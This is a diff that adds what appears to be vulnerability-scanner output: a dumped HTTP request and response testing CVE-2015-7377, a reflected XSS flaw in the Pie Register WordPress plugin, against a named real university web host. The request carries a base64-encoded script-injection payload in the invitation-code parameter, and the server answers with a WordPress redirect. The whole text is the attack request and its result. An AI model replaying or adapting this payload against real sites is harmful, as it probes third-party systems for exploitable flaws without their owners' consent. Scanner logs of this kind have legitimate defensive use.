@@ -1,0 +1,29 @@
+[CVE-2015-7377] Dumped HTTP request for https://camel.science.unimelb.edu.au/?page=pie-register&show_dash_widget=1&invitaion_code=PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+
+
+GET /?page=pie-register&show_dash_widget=1&invitaion_code=PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+ HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2015-7377] Dumped HTTP response https://camel.science.unimelb.edu.au/?page=pie-register&show_dash_widget=1&invitaion_code=PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:26 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://camel.science.unimelb.edu.au/?page=pie-register&show_dash_widget=1&invitaion_code=PC9zY3JpcHQ%20PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ%20
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
